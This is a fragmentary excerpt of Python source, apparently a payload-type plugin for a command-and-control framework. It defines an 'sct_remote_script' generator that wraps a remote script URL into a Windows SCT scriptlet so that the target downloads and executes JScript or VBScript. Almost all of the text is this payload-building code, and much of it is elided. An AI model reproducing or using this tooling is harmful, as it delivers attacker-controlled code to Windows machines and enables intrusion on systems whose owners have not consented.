...
class sct_remote_script(PayloadType):
    name = "sct_remote_script"
    file_extension = "sct"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["jscript_download_save_execute"]
    note = """Creates a SCT payload which will download and execute a JScript or VBScript script"""
...
{payload}
            ...
            script_block = """<script language="{script_type}" src="{url}" />""".format(script_type=script_type, url=url)
...
{script_block}
            ...
            resp.payload = payload.format(script_type=script_type, payload=scriptlet_payload)
